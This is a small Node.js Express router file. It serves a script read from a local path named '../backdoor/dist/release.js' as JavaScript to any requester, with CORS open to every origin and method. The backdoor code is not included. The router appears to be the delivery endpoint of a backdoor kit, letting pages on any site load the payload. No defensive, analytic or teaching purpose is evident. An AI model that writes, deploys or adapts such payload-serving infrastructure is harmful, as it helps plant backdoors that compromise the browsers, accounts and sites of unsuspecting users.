const express = require("express");
const cors = require("cors");
const fs = require("fs");


var cors_options = {
	origin : "*",
	optionsSuccessStatus: 200,
	methods: "GET,HEAD,PUT,PATCH,POST,DELETE"
}

var router = express.Router();

router.use(cors(cors_options));




router.all("/",function(req,res){
	res.append("Content-type","application/javascript");
	fs.readFile("../backdoor/dist/release.js","utf8",function(err,data){
		res.send(data);
	});
});


module.exports = router;